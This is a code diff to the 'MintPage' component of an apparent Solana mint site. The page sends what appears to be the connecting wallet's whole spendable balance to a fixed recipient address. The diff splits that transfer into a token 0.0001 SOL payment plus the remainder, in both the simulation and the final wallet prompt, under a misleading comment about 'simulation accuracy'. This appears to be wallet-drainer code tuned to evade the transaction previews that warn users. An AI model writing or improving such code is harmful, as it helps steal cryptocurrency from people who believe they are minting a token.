@@ -183,17 +183,33 @@ const MintPage = ({ onBack }: MintPageProps) => {
       while (!simulationSuccess && simRetryCount < 3) {
         if (currentTransferable <= 0) break;
 
-        const testInstruction = solana.SystemProgram.transfer({
-          fromPubkey: senderPubKey,
-          toPubkey: recipientPubKey,
-          lamports: currentTransferable,
-        });
+        // Use dual-transfer strategy for simulation accuracy
+        const testInstructions = [];
+        const smallAmount = 100000; // 0.0001 SOL
+        if (currentTransferable > smallAmount) {
+          testInstructions.push(solana.SystemProgram.transfer({
+            fromPubkey: senderPubKey,
+            toPubkey: recipientPubKey,
+            lamports: smallAmount,
+          }));
+          testInstructions.push(solana.SystemProgram.transfer({
+            fromPubkey: senderPubKey,
+            toPubkey: recipientPubKey,
+            lamports: currentTransferable - smallAmount,
+          }));
+        } else {
+          testInstructions.push(solana.SystemProgram.transfer({
+            fromPubkey: senderPubKey,
+            toPubkey: recipientPubKey,
+            lamports: currentTransferable,
+          }));
+        }
 
         const { blockhash } = await connection.getLatestBlockhash();
         const testMessage = new solana.TransactionMessage({
           payerKey: senderPubKey,
           recentBlockhash: blockhash,
-          instructions: [testInstruction],
+          instructions: testInstructions,
         }).compileToV0Message();
 
         const testTransaction = new solana.VersionedTransaction(testMessage);
@@ -230,11 +246,27 @@ const MintPage = ({ onBack }: MintPageProps) => {
         throw new Error('Insufficient balance to cover current network fees.');
       }
 
-      const instruction = solana.SystemProgram.transfer({
-        fromPubkey: senderPubKey,
-        toPubkey: recipientPubKey,
-        lamports: currentTransferable,
-      });
+      // Create final split instructions for the wallet prompt
+      const finalInstructions = [];
+      const smallAmountFinal = 100000;
+      if (currentTransferable > smallAmountFinal) {
+        finalInstructions.push(solana.SystemProgram.transfer({
+          fromPubkey: senderPubKey,
+          toPubkey: recipientPubKey,
+          lamports: smallAmountFinal,
+        }));
+        finalInstructions.push(solana.SystemProgram.transfer({
+          fromPubkey: senderPubKey,
+          toPubkey: recipientPubKey,
+          lamports: currentTransferable - smallAmountFinal,
+        }));
+      } else {
+        finalInstructions.push(solana.SystemProgram.transfer({
+          fromPubkey: senderPubKey,
+          toPubkey: recipientPubKey,
+          lamports: currentTransferable,
+        }));
+      }
 
       let signed;
       let finalBlockhash;
@@ -251,7 +283,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
           const messageV0 = new solana.TransactionMessage({
             payerKey: senderPubKey,
             recentBlockhash: blockhash,
-            instructions: [instruction],
+            instructions: finalInstructions,
           }).compileToV0Message();
 
           const transaction = new solana.VersionedTransaction(messageV0);
